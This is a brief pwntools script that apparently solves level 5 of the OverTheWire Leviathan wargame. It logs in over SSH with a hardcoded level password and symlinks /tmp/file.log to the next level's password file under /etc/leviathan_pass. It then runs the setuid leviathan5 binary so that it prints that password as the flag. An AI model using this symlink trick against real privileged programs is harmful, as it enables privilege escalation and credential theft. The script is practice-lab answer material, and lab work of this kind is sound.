#!/usr/bin/env python2
from pwn import *
from pygments import highlight
from pygments.lexers import CLexer
from pygments.formatters import TerminalFormatter
from pwnlib.util.fiddling import randoms
from time import sleep

level = 5
user = 'leviathan%s' % level
host = 'leviathan.labs.overthewire.org'
password = 'Tith4cokei'
port = 2223

def connectToLevel():
    return ssh(user=user, host=host, port=port, password=password)

context(arch='i386', os='linux')

sh = connectToLevel()
sh = sh.process('/bin/sh', env={'PS1':''})
sh.sendline('ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log')
sh.sendline('./leviathan5')
log.info('Flag = %s' % sh.recvline())
